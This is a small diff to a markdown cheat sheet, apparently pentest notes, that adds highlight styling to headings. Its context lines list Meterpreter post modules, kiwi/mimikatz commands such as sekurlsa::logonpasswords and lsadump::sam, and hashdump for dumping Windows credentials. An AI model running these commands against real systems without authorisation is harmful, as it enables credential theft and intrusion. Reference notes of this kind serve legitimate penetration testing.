@@ -1,6 +1,6 @@
 # Meterpreter
 
-### Meterpreter Modules
+### <mark style="color:orange;">Meterpreter Modules</mark>
 
 ```
 post/windows/manage/wdigest_caching
@@ -14,7 +14,7 @@ post/windows/gather/lsa_secrets
 post/windows/gather/smart_hashdump
 ```
 
-### kiwi
+### <mark style="color:orange;">kiwi</mark>
 
 ```
 load kiwi
@@ -22,7 +22,7 @@ creds_all
 kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
 ```
 
-### hashdump
+### <mark style="color:orange;">hashdump</mark>
 
 ```
 meterpreter > hashdump
